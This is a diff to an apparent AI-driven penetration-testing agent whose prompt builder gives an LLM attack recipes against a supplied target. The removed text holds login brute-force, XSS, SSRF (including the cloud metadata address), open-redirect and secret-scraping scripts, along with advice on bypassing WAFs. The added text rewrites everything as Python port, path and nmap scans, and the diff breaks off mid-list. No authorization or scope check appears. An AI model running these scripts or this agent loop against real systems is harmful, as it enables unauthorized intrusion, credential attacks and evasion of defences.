@@ -229,25 +229,18 @@ class AIBrain:
         prompt += f"Last cmd: {last_command[:100] if last_command else 'None'}\n"
         prompt += f"Output: {last_output[:600] if last_output else 'None'}\n\n"
         prompt += "ABSOLUTE RULES:\n"
-        prompt += "1. NEVER add proxychains/torsocks - proxy is AUTOMATIC\n"
-        prompt += "2. NEVER use nmap -p- - use --top-ports 1000 or -F\n"
-        prompt += "3. Allowed actions: COMMAND, SCRIPT, GOAL_ACHIEVED, SWITCH_PHASE\n"
-        prompt += "4. NEVER repeat a failed command. Use DIFFERENT tool or approach\n"
-        prompt += "5. If output says 'not found' - tool NOT installed. Use alternative\n"
-        prompt += "6. ALTERNATE: tool -> SCRIPT -> tool -> SCRIPT (never 2 basic tools in a row)\n"
-        prompt += "7. For complex multi-step ops, use SCRIPT action (file-based, no quoting issues)\n"
-        prompt += "8. Wordlists: /usr/share/wordlists/dirb/common.txt, /usr/share/wordlists/rockyou.txt\n"
-        prompt += "9. If blocked/refused, switch to OSINT (crt.sh, dig, whois)\n"
-        prompt += "10. curl: -sk --max-time 15\n\n"
-        prompt += "INSTALLED: nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, python3, bash\n"
-        prompt += "NOT INSTALLED: httpx(Go), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gospider, subfinder, testssl.sh, sublist3r, amass, waybackurls, wapiti, shodan\n\n"
+        prompt += "1. ALWAYS use the SCRIPT action with 'python' as the script_type.\n"
+        prompt += "2. NEVER use the COMMAND action. Only SCRIPT, GOAL_ACHIEVED, SWITCH_PHASE are allowed.\n"
+        prompt += "3. Write python scripts to perform all security tasks.\n"
+        prompt += "4. NEVER add proxychains/torsocks - proxy is AUTOMATIC\n"
+        prompt += "5. If output says 'not found' - tool NOT installed. Use a different python library or approach.\n"
+        prompt += "6. Wordlists: /usr/share/wordlists/dirb/common.txt, /usr/share/wordlists/rockyou.txt\n"
+        prompt += "7. If blocked/refused, switch to OSINT scripts (e.g., querying crt.sh with requests).\n\n"
+        prompt += "INSTALLED TOOLS (for context, but call them from your python script):\n"
+        prompt += "nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, python3, bash\n\n"
         prompt += "CRITICAL: Output ONLY raw JSON. No markdown, no explanation, no ```json blocks. Just the JSON object.\n\n"
-        prompt += "JSON FORMAT - Basic tool:\n"
-        prompt += '{"reasoning":"why","action":"COMMAND","command":"nmap -sV -T4 --top-ports 1000 ' + target + '","phase":"' + phase + '","expected_outcome":"what"}\n\n'
-        prompt += "JSON FORMAT - SCRIPT file (PREFERRED for complex tasks!):\n"
-        prompt += '{"reasoning":"why","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"' + target + '\\"\\necho \'=== Scan ===\'\\nfor p in .env .git/HEAD robots.txt; do\\n  code=$(curl -sk -o /dev/null -w \'%{http_code}\' \\"https://$target/$p\\" --max-time 10)\\n  [ \\"$code\\" != \\"404\\" ] && echo \\"$p -> $code\\"\\ndone","phase":"' + phase + '","expected_outcome":"what"}\n\n'
-        prompt += "JSON FORMAT - Python SCRIPT:\n"
-        prompt += '{"reasoning":"why","action":"SCRIPT","script_type":"python","script":"import urllib.request, ssl\\nctx = ssl._create_unverified_context()\\ntarget = \'' + target + '\'\\nfor p in [\'.env\',\'robots.txt\',\'api/v1\']:\\n    try:\\n        r = urllib.request.urlopen(f\'https://{target}/{p}\', context=ctx, timeout=10)\\n        print(f\'[{r.status}] /{p}\')\\n    except: pass","phase":"' + phase + '","expected_outcome":"what"}\n\n'
+        prompt += "JSON FORMAT - Python SCRIPT (THE ONLY ALLOWED ACTION):\n"
+        prompt += '{"reasoning":"I need to check for open ports, so I will write a Python script to do a simple TCP socket connection test.","action":"SCRIPT","script_type":"python","script":"import socket\\ntarget = \'' + target + '\'\\nports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5900, 8080, 8443]\\nfor port in ports:\\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\n    socket.setdefaulttimeout(0.5)\\n    result = s.connect_ex((target, port))\\n    if result == 0:\\n        print(f\'Port {{port}} is open\')\\n    s.close()","phase":"' + phase + '","expected_outcome":"A list of open ports."}\n\n'
         prompt += "JSON FORMAT - Done:\n"
         prompt += '{"reasoning":"done","action":"GOAL_ACHIEVED","findings_summary":"results","phase":"REPORT"}\n'
         return prompt
@@ -274,91 +267,36 @@ Command: {last_cmd_str}
 Output: {last_out_str}
 
 === ABSOLUTE RULES (VIOLATION = SCAN FAILURE) ===
-1. NEVER add proxychains, torsocks, or any proxy wrapper. Proxy is AUTOMATIC.
-2. NEVER use nmap -p- (takes forever). Use --top-ports 1000 or -F.
-3. Allowed actions: COMMAND, SCRIPT, GOAL_ACHIEVED, SWITCH_PHASE
-4. NEVER repeat a failed command. Use a COMPLETELY DIFFERENT tool or script.
-5. If output says "not found", the tool is NOT installed. Skip it forever.
-6. NEVER use bash -c '...' for complex scripts! Use SCRIPT action instead (writes to file).
-7. If connection refused/blocked, switch to passive OSINT immediately.
-8. sqlmap + CSRF: use --csrf-token="_token" --csrf-url=URL --threads=1
-9. ALTERNATE: tool -> SCRIPT -> tool -> SCRIPT (NEVER 2 basic tools in a row)
-10. SCRIPT action is PREFERRED for multi-step, loops, curl with special chars, etc.
+1. ALWAYS use the SCRIPT action with 'python' as the script_type to perform tasks.
+2. The ONLY allowed actions are: SCRIPT, GOAL_ACHIEVED, SWITCH_PHASE.
+3. NEVER use the COMMAND action. You must write a python script for everything.
+4. Your python scripts should be self-contained and import any necessary libraries (e.g., requests, socket, subprocess).
+5. If a tool like 'nmap' is needed, call it from your python script using `subprocess.run()`.
+6. NEVER add proxychains, torsocks, or any proxy wrapper. Proxy is AUTOMATIC.
+7. If connection refused/blocked, switch to passive OSINT scripts (e.g., querying public APIs).
 
-=== INSTALLED TOOLS ===
+=== INSTALLED TOOLS (for context, call from python script if needed) ===
 nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, sed, awk, bash, python3
-
-=== NOT INSTALLED (DO NOT USE) ===
-httpx(Go), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gospider, subfinder, testssl.sh, sublist3r, amass, waybackurls, wapiti, shodan
-
-=== SPEED RULES ===
-- nmap: -sV -sC -T4 --top-ports 1000
-- sqlmap: --batch --level=3 --risk=3 --threads=10 (threads=1 if CSRF)
-- ffuf: -w /usr/share/wordlists/dirb/common.txt -t 50 -mc 200,301,302,403
-- curl: -sk --max-time 15
-- nuclei: -u URL -severity critical,high
-
-=== WORDLISTS ===
-- /usr/share/wordlists/dirb/common.txt (web dirs - fast)
-- /usr/share/wordlists/rockyou.txt (passwords)
-- /usr/share/wordlists/fasttrack.txt (quick passwords)
 
 === ACTION FORMATS (JSON ONLY) ===
 
-FORMAT 1 - Basic tool command (simple one-liners):
-{{"reasoning":"why","action":"COMMAND","command":"nmap -sV -T4 --top-ports 1000 {target}","phase":"{phase}","expected_outcome":"what"}}
-
-FORMAT 2 - SCRIPT file (PREFERRED for complex tasks!):
-The SCRIPT action writes code to a file and executes it. NO quoting issues. NO escaping hell.
-Use this for ANY multi-step logic, loops, curl with %{{http_code}}, grep with regex, etc.
-
-BASH SCRIPT EXAMPLE - Sensitive File Discovery:
-{{"reasoning":"Scan for sensitive files and configs","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Sensitive File Discovery ==='\\nfor p in .env .git/HEAD .git/config wp-config.php.bak .htaccess .htpasswd server-status server-info phpinfo.php robots.txt sitemap.xml .well-known/security.txt api/v1 graphql swagger/v1/swagger.json wp-json/wp/v2/users actuator/env actuator/health; do\\n  RESP=$(curl -sk -o /dev/null -w '%{{http_code}}:%{{size_download}}' \\"https://$target/$p\\" --max-time 10 2>/dev/null)\\n  HTTP=$(echo \\"$RESP\\" | cut -d: -f1)\\n  SIZE=$(echo \\"$RESP\\" | cut -d: -f2)\\n  [ \\"$HTTP\\" != \\"404\\" ] && [ \\"$HTTP\\" != \\"000\\" ] && [ \\"$SIZE\\" != \\"0\\" ] && echo \\"$p -> HTTP $HTTP ($SIZE bytes)\\"\\ndone","phase":"{phase}","expected_outcome":"Find exposed sensitive files"}}
-
-BASH SCRIPT EXAMPLE - Security Headers Audit:
-{{"reasoning":"Check security headers","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Security Headers ==='\\nH=$(curl -skI \\"https://$target/\\")\\necho \\"$H\\" | head -20\\necho '--- Missing Headers ---'\\nfor h in X-Frame-Options Content-Security-Policy X-XSS-Protection Strict-Transport-Security X-Content-Type-Options Referrer-Policy Permissions-Policy; do\\n  echo \\"$H\\" | grep -qi \\"$h\\" || echo \\"MISSING: $h\\"\\ndone\\necho '--- Cookie Security ---'\\necho \\"$H\\" | grep -i set-cookie | while read line; do\\n  echo \\"$line\\" | grep -qi httponly || echo \\"Cookie missing HttpOnly\\"\\n  echo \\"$line\\" | grep -qi secure || echo \\"Cookie missing Secure\\"\\n  echo \\"$line\\" | grep -qi samesite || echo \\"Cookie missing SameSite\\"\\ndone","phase":"{phase}","expected_outcome":"Identify missing security headers"}}
-
-BASH SCRIPT EXAMPLE - Parameter Fuzzing:
-{{"reasoning":"Fuzz URL parameters","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Parameter Fuzzing ==='\\nfor p in id user admin page file path cmd search query url redirect next callback action type format debug test token key api; do\\n  r=$(curl -sk -o /dev/null -w '%{{http_code}}:%{{size_download}}' \\"https://$target/?$p=test123zenith\\" --max-time 10)\\n  echo \\"$p -> $r\\"\\ndone","phase":"{phase}","expected_outcome":"Discover active parameters"}}
-
-BASH SCRIPT EXAMPLE - JS Secrets Scanner:
-{{"reasoning":"Find secrets in JavaScript files","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== JS Secrets Scanner ==='\\nfor js in $(curl -sk \\"https://$target/\\" | grep -oE 'src=\\"[^\\"]+\\\\.js\\"' | sed 's/src=\\"//;s/\\"//' | head -20); do\\n  [[ \\"$js\\" == /* ]] && js=\\"https://$target$js\\"\\n  echo \\"\\\\n=== $js ===\\"\\n  curl -sk \\"$js\\" 2>/dev/null | grep -oiE '(api[_-]?key|token|secret|password|auth|firebase|aws_|private[_-]?key)[a-zA-Z0-9_]*[=:][^ ,;]+' | head -20\\ndone","phase":"{phase}","expected_outcome":"Extract hardcoded secrets from JS"}}
-
-BASH SCRIPT EXAMPLE - Subdomain Bruteforce:
-{{"reasoning":"Bruteforce subdomains","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Subdomain Bruteforce ==='\\nfor sub in www mail ftp admin dev staging api test vpn portal app cdn beta internal git jenkins grafana kibana monitor status blog shop; do\\n  ip=$(dig +short $sub.$target 2>/dev/null | head -1)\\n  [ -n \\"$ip\\" ] && echo \\"FOUND: $sub.$target -> $ip\\"\\ndone","phase":"{phase}","expected_outcome":"Discover subdomains"}}
-
-BASH SCRIPT EXAMPLE - CSRF-Aware Login Brute:
-{{"reasoning":"Brute force login with CSRF token handling","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== CSRF-Aware Login Brute ==='\\nfor pw in admin password 123456 admin123 letmein master welcome root toor changeme; do\\n  TOKEN=$(curl -sk \\"https://$target/login\\" -c /tmp/zcookie 2>/dev/null | grep -oP 'name=\\"_token\\" value=\\"[^\\"]+' | sed 's/.*value=\\"//')\\n  RESP=$(curl -sk -X POST \\"https://$target/login\\" -b /tmp/zcookie -d \\"email=admin@$target&password=$pw&_token=$TOKEN\\" -w '\\\\nHTTP_%{{http_code}}_SIZE_%{{size_download}}' -o /tmp/zbody -D /tmp/zheaders --max-time 15 2>/dev/null)\\n  echo \\"$pw -> $RESP\\"\\n  sleep 1\\ndone","phase":"{phase}","expected_outcome":"Test common passwords with CSRF handling"}}
-
-BASH SCRIPT EXAMPLE - Open Redirect Test:
-{{"reasoning":"Test for open redirect vulnerabilities","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Open Redirect Test ==='\\nfor param in url redirect next callback return_to goto dest destination rurl; do\\n  for redir in 'https://evil.com' '//evil.com' '/\\\\evil.com'; do\\n    RESP=$(curl -sk -D /tmp/zheaders -o /dev/null \\"https://$target/?$param=$redir\\" --max-time 10 2>/dev/null)\\n    LOC=$(grep -i '^location:' /tmp/zheaders 2>/dev/null | head -1)\\n    [ -n \\"$LOC\\" ] && echo \\"REDIRECT: $param=$redir -> $LOC\\"\\n  done\\ndone","phase":"{phase}","expected_outcome":"Find open redirect vulnerabilities"}}
-
-BASH SCRIPT EXAMPLE - Web Crawl & Link Extract:
-{{"reasoning":"Crawl and extract all links","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Web Crawl ==='\\ncurl -sk \\"https://$target/\\" | grep -oE '(href|src)=\\"[^\\"]+\\"' | sed 's/href=\\"//;s/src=\\"//;s/\\"//' | sort -u | while read url; do\\n  [[ \\"$url\\" == /* ]] && url=\\"https://$target$url\\"\\n  echo \\"$url\\"\\ndone","phase":"{phase}","expected_outcome":"Map all links and resources"}}
+You MUST reply with a JSON object matching this format. The ONLY allowed action is SCRIPT.
 
 PYTHON SCRIPT EXAMPLE - Advanced Path Scanner:
-{{"reasoning":"Python-based path scanner with response analysis","action":"SCRIPT","script_type":"python","script":"import urllib.request, ssl, sys\\nctx = ssl._create_unverified_context()\\ntarget = '{target}'\\npaths = ['.env', '.git/config', 'debug', 'trace', 'api', 'graphql',\\n         'wp-json/wp/v2/users', 'server-info', 'actuator/env',\\n         'swagger/v1/swagger.json', '.well-known/security.txt',\\n         'phpinfo.php', 'robots.txt', 'sitemap.xml']\\nprint('=== Python Path Scanner ===')\\nfor p in paths:\\n    try:\\n        r = urllib.request.urlopen(f'https://{{target}}/{{p}}', context=ctx, timeout=10)\\n        body = r.read(500).decode(errors='ignore')\\n        print(f'[{{r.status}}] /{{p}} ({{len(body)}}b): {{body[:100]}}')\\n    except urllib.error.HTTPError as e:\\n        if e.code != 404:\\n            print(f'[{{e.code}}] /{{p}}')\\n    except: pass","phase":"{phase}","expected_outcome":"Discover accessible paths with response preview"}}
+{{"reasoning":"I will write a Python script to scan for common and sensitive paths on the target server. This is more flexible than a simple command.","action":"SCRIPT","script_type":"python","script":"import urllib.request, ssl, sys\\nctx = ssl._create_unverified_context()\\ntarget = '{target}'\\npaths = ['.env', '.git/config', 'debug', 'trace', 'api', 'graphql',\\n         'wp-json/wp/v2/users', 'server-info', 'actuator/env',\\n         'swagger/v1/swagger.json', '.well-known/security.txt',\\n         'phpinfo.php', 'robots.txt', 'sitemap.xml']\\nprint('=== Python Path Scanner ===')\\nfor p in paths:\\n    try:\\n        r = urllib.request.urlopen(f'https://{{target}}/{{p}}', context=ctx, timeout=10)\\n        body = r.read(500).decode(errors='ignore')\\n        print(f'[{{r.status}}] /{{p}} ({{len(body)}}b): {{body[:100]}}')\\n    except urllib.error.HTTPError as e:\\n        if e.code != 404:\\n            print(f'[{{e.code}}] /{{p}}')\\n    except: pass","phase":"{phase}","expected_outcome":"Discover accessible paths with response preview"}}
 
-PYTHON SCRIPT EXAMPLE - SSRF Probe:
-{{"reasoning":"Test for SSRF","action":"SCRIPT","script_type":"python","script":"import urllib.request, ssl, socket\\nctx = ssl._create_unverified_context()\\ntarget = '{target}'\\nparams = ['url', 'file', 'path', 'page', 'load', 'fetch', 'src', 'dest', 'redirect', 'uri']\\nssrf_targets = ['http://127.0.0.1:22', 'http://localhost:80', 'http://169.254.169.254/latest/meta-data/']\\nprint('=== SSRF Probe ===')\\nfor param in params:\\n    for st in ssrf_targets:\\n        try:\\n            r = urllib.request.urlopen(f'https://{{target}}/?{{param}}={{st}}', context=ctx, timeout=10)\\n            print(f'INTERESTING: {{param}}={{st}} -> {{r.status}} ({{len(r.read(200))}}b)')\\n        except urllib.error.HTTPError as e:\\n            if e.code not in [404, 403]:\\n                print(f'NOTE: {{param}}={{st}} -> {{e.code}}')\\n        except: pass","phase":"{phase}","expected_outcome":"Identify SSRF vulnerabilities"}}
+PYTHON SCRIPT EXAMPLE - Subprocess Nmap Scan:
+{{"reasoning":"To get detailed service versions, I will use Python's subprocess module to run nmap. This allows more control than a simple command.","action":"SCRIPT","script_type":"python","script":"import subprocess, sys\\ntarget = '{target}'\\nprint(f'=== Nmap Service Scan for {target} ===')\\ncmd = ['nmap', '-sV', '-T4', '--top-ports', '100', target]\\ntry:\\n    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)\\n    print(result.stdout)\\n    if result.stderr:\\n        print('---stderr---\\n', result.stderr)\\nexcept FileNotFoundError:\\n    print('nmap is not installed. Skipping.')\\nexcept subprocess.TimeoutExpired:\\n    print('nmap scan timed out.')","phase":"{phase}","expected_outcome":"Nmap scan results showing service versions."}}
 
-PYTHON SCRIPT EXAMPLE - XSS Tester:
-{{"reasoning":"Test for XSS in form parameters","action":"SCRIPT","script_type":"python","script":"import urllib.request, urllib.parse, ssl, re\\nctx = ssl._create_unverified_context()\\ntarget = '{target}'\\nprint('=== XSS Tester ===')\\n# Get form params\\ntry:\\n    body = urllib.request.urlopen(f'https://{{target}}/', context=ctx, timeout=10).read().decode(errors='ignore')\\n    params = list(set(re.findall(r'name=\\"([^\\"]+)\\"', body)))\\nexcept: params = ['q', 'search', 'id', 'page']\\npayloads = ['<script>alert(1)</script>', '\\\"onmouseover=\\\"alert(1)\\\"', '><img src=x onerror=alert(1)>', '<svg onload=alert(1)>']\\nfor param in params[:10]:\\n    for pay in payloads:\\n        try:\\n            encoded = urllib.parse.quote(pay)\\n            r = urllib.request.urlopen(f'https://{{target}}/?{{param}}={{encoded}}', context=ctx, timeout=10)\\n            resp = r.read(5000).decode(errors='ignore')\\n            if pay in resp or 'alert(1)' in resp:\\n                print(f'POSSIBLE XSS: param={{param}} payload={{pay}}')\\n        except: pass","phase":"{phase}","expected_outcome":"Discover reflected XSS vulnerabilities"}}
-
-FORMAT 3 - Done:
+FORMAT 2 - Done:
 {{"reasoning":"summary of all findings","action":"GOAL_ACHIEVED","findings_summary":"all vulns found","phase":"REPORT"}}
 
 === SCRIPTING RULES ===
-1. ALTERNATE: tool -> SCRIPT -> tool -> SCRIPT (NEVER 2 basic tools in a row)
-2. Use SCRIPT action for ANY multi-step operation (loops, curl %{{http_code}}, regex, chaining)
-3. Use COMMAND for simple single-tool runs (nmap, nikto, sqlmap, nuclei, ffuf, etc.)
-4. SCRIPT code is written to a file and executed - NO bash -c quoting issues!
-5. In bash SCRIPT: use #!/bin/bash header, set target variable, use $target
-6. In python SCRIPT: import what you need, target = '{target}'
-7. Custom scripts bypass WAF because they don't have tool signatures
-8. ALWAYS add --max-time to curl inside scripts
-9. Use /tmp/z* for temp files (zcookie, zbody, zheaders)
-10. Chain operations: extract -> analyze -> test in ONE script
+1. All actions must be Python scripts.
+2. Use libraries like `requests` for web, `socket` for ports, `subprocess` for external tools.
+3. Your script is written to a file and executed - no quoting issues!
+4. Target is available in your script via `target = '{target}'`.
+5. Keep scripts focused on a single task for better analysis of the output.
 """
         return prompt
 
@@ -533,174 +471,39 @@ FORMAT 3 - Done:
                     "phase": "REPORT"
                 }
             
-            # Other errors - fallback action (vary commands to avoid duplicate detection)
-            import random
-            fallback_options = [
-                {
-                    "reasoning": f"AI error: {error_msg[:80]}. Fallback: HTTP headers.",
-                    "action": "COMMAND",
-                    "command": f"curl -skI https://{target}/ | head -30",
-                    "phase": phase,
-                    "expected_outcome": "HTTP headers check"
-                },
-                {
-                    "reasoning": f"AI error: {error_msg[:80]}. Fallback: DNS.",
-                    "action": "COMMAND",
-                    "command": f"dig ANY {target}",
-                    "phase": phase,
-                    "expected_outcome": "DNS records lookup"
-                },
-                {
-                    "reasoning": f"AI error: {error_msg[:80]}. Fallback: WHOIS.",
-                    "action": "COMMAND",
-                    "command": f"whois {target} | head -40",
-                    "phase": phase,
-                    "expected_outcome": "WHOIS information"
-                },
-                {
-                    "reasoning": f"AI error: {error_msg[:80]}. Fallback: sensitive files.",
-                    "action": "SCRIPT",
-                    "script_type": "bash",
-                    "script": f"#!/bin/bash\ntarget=\"{target}\"\necho '=== Sensitive Files ==='\nfor p in .env .git/HEAD robots.txt sitemap.xml .htaccess server-status; do\n  CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' \"https://$target/$p\" --max-time 10)\n  [ \"$CODE\" != \"404\" ] && [ \"$CODE\" != \"000\" ] && echo \"$p -> $CODE\"\ndone",
-                    "phase": phase,
-                    "expected_outcome": "Sensitive file discovery"
-                },
-                {
-                    "reasoning": f"AI error: {error_msg[:80]}. Fallback: SSL.",
-                    "action": "COMMAND",
-                    "command": f"sslscan --no-colour {target} | head -40",
-                    "phase": phase,
-                    "expected_outcome": "SSL/TLS scan"
-                },
-                {
-                    "reasoning": f"AI error: {error_msg[:80]}. Fallback: nikto.",
-                    "action": "COMMAND",
-                    "command": f"nikto -h https://{target} -maxtime 120 -C all",
-                    "phase": phase,
-                    "expected_outcome": "Web vulnerability scan"
-                },
-            ]
-            return random.choice(fallback_options)
+            # Other errors - fallback action
+            return self._fallback_decision(target, phase, f"AI error: {error_msg[:80]}")
 
-    def _fallback_decision(self, target, phase):
-        """Generate a varied fallback command when JSON parsing fails.
-        Uses a rotating index to avoid repeating the same fallback."""
+    def _fallback_decision(self, target, phase, reason="JSON parse failed"):
+        """Generate a Python SCRIPT fallback when AI fails."""
         if not hasattr(self, '_fallback_index'):
             self._fallback_index = 0
         
         fallback_options = [
             {
-                "reasoning": "JSON parse failed - sensitive file discovery",
-                "action": "SCRIPT",
-                "script_type": "bash",
-                "script": f"#!/bin/bash\ntarget=\"{target}\"\necho '=== Sensitive File Scan ==='\nfor p in .env .git/HEAD .git/config robots.txt sitemap.xml .htaccess wp-config.php.bak server-status phpinfo.php .well-known/security.txt api/v1 graphql; do\n  RESP=$(curl -sk -o /dev/null -w '%{{http_code}}:%{{size_download}}' \"https://$target/$p\" --max-time 10 2>/dev/null)\n  HTTP=$(echo \"$RESP\" | cut -d: -f1)\n  SIZE=$(echo \"$RESP\" | cut -d: -f2)\n  [ \"$HTTP\" != \"404\" ] && [ \"$HTTP\" != \"000\" ] && [ \"$SIZE\" != \"0\" ] && echo \"$p -> HTTP $HTTP ($SIZE bytes)\"\ndone",
-                "phase": phase,
-                "expected_outcome": "Discover exposed sensitive files"
+                "reasoning": f"{reason} - running fallback Python port scan.",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import socket, sys\ntarget='{target}'\nports=[21,22,23,25,53,80,110,143,443,3306,8080,8443]\nprint(f'=== Python Port Scan: {target} ===')\nfor p in ports:\n  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.settimeout(0.5)\n  if s.connect_ex((target,p))==0:\n    print(f'[+] Port {{p}} is OPEN')\n  s.close()",
+                "phase": phase, "expected_outcome": "Discover common open ports."
             },
             {
-                "reasoning": "JSON parse failed - security header audit",
-                "action": "SCRIPT",
-                "script_type": "bash",
-                "script": f"#!/bin/bash\ntarget=\"{target}\"\necho '=== Security Headers ==='\nH=$(curl -skI \"https://$target/\")\necho \"$H\" | head -20\necho '--- Missing Headers ---'\nfor h in X-Frame-Options Content-Security-Policy X-XSS-Protection Strict-Transport-Security X-Content-Type-Options Referrer-Policy Permissions-Policy; do\n  echo \"$H\" | grep -qi \"$h\" || echo \"MISSING: $h\"\ndone",
-                "phase": phase,
-                "expected_outcome": "Identify missing security headers"
+                "reasoning": f"{reason} - running fallback Python headers check.",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import urllib.request, ssl\nctx=ssl._create_unverified_context()\ntarget='{target}'\nprint(f'=== Python Headers Check: {target} ===')\ntry:\n  r=urllib.request.urlopen(f'https://{{target}}', context=ctx, timeout=10)\n  for h,v in r.getheaders():\n    print(f'{{h}}: {{v}}')\nexcept Exception as e:\n  print(f'Error: {{e}}')",
+                "phase": phase, "expected_outcome": "Get HTTP security headers."
             },
             {
-                "reasoning": "JSON parse failed - subdomain discovery",
-                "action": "SCRIPT",
-                "script_type": "bash",
-                "script": f"#!/bin/bash\ntarget=\"{target}\"\necho '=== Subdomain Discovery ==='\nfor sub in www mail ftp admin dev staging api test vpn portal app cdn beta internal git monitor status blog; do\n  ip=$(dig +short $sub.$target 2>/dev/null | head -1)\n  [ -n \"$ip\" ] && echo \"FOUND: $sub.$target -> $ip\"\ndone",
-                "phase": phase,
-                "expected_outcome": "Discover subdomains"
+                "reasoning": f"{reason} - running fallback Python DNS resolver.",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import socket\ntarget='{target}'\nprint(f'=== Python DNS Resolve: {target} ===')\ntry:\n  ip=socket.gethostbyname(target)\n  print(f'IP Address: {{ip}}')\n  names=socket.gethostbyaddr(ip)\n  print(f'Hostnames: {{names}}')\nexcept Exception as e:\n  print(f'Error: {{e}}')",
+                "phase": phase, "expected_outcome": "Resolve IP and hostnames for the target."
             },
             {
-                "reasoning": "JSON parse failed - HTTP headers",
-                "action": "COMMAND",
-                "command": f"curl -skI https://{target}/ | head -30",
-                "phase": phase,
-                "expected_outcome": "HTTP headers and server info"
-            },
-            {
-                "reasoning": "JSON parse failed - DNS enumeration",
-                "action": "COMMAND",
-                "command": f"dig ANY {target}",
-                "phase": phase,
-                "expected_outcome": "DNS records"
-            },
-            {
-                "reasoning": "JSON parse failed - SSL scan",
-                "action": "COMMAND",
-                "command": f"sslscan --no-colour {target} | head -40",
-                "phase": phase,
-                "expected_outcome": "SSL/TLS configuration"
-            },
-            {
-                "reasoning": "JSON parse failed - Python path scanner",
-                "action": "SCRIPT",
-                "script_type": "python",
-                "script": f"import urllib.request, ssl\nctx = ssl._create_unverified_context()\ntarget = '{target}'\npaths = ['.env', '.git/config', 'robots.txt', 'sitemap.xml', 'api/v1', 'graphql', 'wp-json/wp/v2/users', 'actuator/env', 'swagger/v1/swagger.json']\nprint('=== Path Scanner ===')\nfor p in paths:\n    try:\n        r = urllib.request.urlopen(f'https://{{target}}/{{p}}', context=ctx, timeout=10)\n        print(f'[{{r.status}}] /{{p}}')\n    except urllib.error.HTTPError as e:\n        if e.code != 404: print(f'[{{e.code}}] /{{p}}')\n    except: pass",
-                "phase": phase,
-                "expected_outcome": "Discover accessible paths"
-            },
-            {
-                "reasoning": "JSON parse failed - nmap quick scan",
-                "action": "COMMAND",
-                "command": f"nmap -sV -T4 -F {target}",
-                "phase": phase,
-                "expected_outcome": "Quick port and service discovery"
-            },
-            {
-                "reasoning": "JSON parse failed - certificate transparency",
-                "action": "SCRIPT",
-                "script_type": "bash",
-                "script": f"#!/bin/bash\ntarget=\"{target}\"\necho '=== Certificate Transparency ==='\ncurl -sk \"https://crt.sh/?q=%25.$target&output=json\" --max-time 20 2>/dev/null | python3 -c \"import sys,json; [print(x.get('name_value','')) for x in json.load(sys.stdin)]\" 2>/dev/null | sort -u | head -30",
-                "phase": phase,
-                "expected_outcome": "Find subdomains via certificate transparency"
-            },
-            {
-                "reasoning": "JSON parse failed - nuclei scan",
-                "action": "COMMAND",
-                "command": f"nuclei -u https://{target} -severity critical,high -silent",
-                "phase": phase,
-                "expected_outcome": "Find critical/high vulnerabilities"
-            },
-            {
-                "reasoning": "JSON parse failed - directory bruteforce",
-                "action": "COMMAND",
-                "command": f"gobuster dir -u https://{target} -w /usr/share/wordlists/dirb/common.txt -t 30 -q --no-error -k",
-                "phase": phase,
-                "expected_outcome": "Discover hidden directories"
-            },
-            {
-                "reasoning": "JSON parse failed - WHOIS lookup",
-                "action": "COMMAND",
-                "command": f"whois {target} | head -50",
-                "phase": phase,
-                "expected_outcome": "Domain registration info"
-            },
-            {
-                "reasoning": "JSON parse failed - parameter fuzzing",
-                "action": "SCRIPT",
-                "script_type": "bash",
-                "script": f"#!/bin/bash\ntarget=\"{target}\"\necho '=== Parameter Fuzzing ==='\nfor p in id user admin page file path cmd search query url redirect next callback action type format debug test token key api; do\n  r=$(curl -sk -o /dev/null -w '%{{http_code}}:%{{size_download}}' \"https://$target/?$p=test123zenith\" --max-time 10)\n  echo \"$p -> $r\"\ndone",
-                "phase": phase,
-                "expected_outcome": "Discover active parameters"
-            },
-            {
-                "reasoning": "JSON parse failed - assetfinder subdomains",
-                "action": "COMMAND",
-                "command": f"assetfinder --subs-only {target} | head -30",
-                "phase": phase,
-                "expected_outcome": "Discover subdomains via assetfinder"
-            },
-            {
-                "reasoning": "JSON parse failed - cookie security check",
-                "action": "SCRIPT",
-                "script_type": "bash",
-                "script": f"#!/bin/bash\ntarget=\"{target}\"\necho '=== Cookie Security Audit ==='\ncurl -skI \"https://$target/\" | grep -i 'set-cookie' | while read line; do\n  echo \"Cookie: $line\"\n  echo \"$line\" | grep -qi httponly || echo \"  WARNING: Missing HttpOnly\"\n  echo \"$line\" | grep -qi secure || echo \"  WARNING: Missing Secure\"\n  echo \"$line\" | grep -qi samesite || echo \"  WARNING: Missing SameSite\"\ndone\necho '--- Done ---'",
-                "phase": phase,
-                "expected_outcome": "Check cookie security flags"
-            },
+                "reasoning": f"{reason} - running fallback Python path scanner.",
+                "action": "SCRIPT", "script_type": "python",
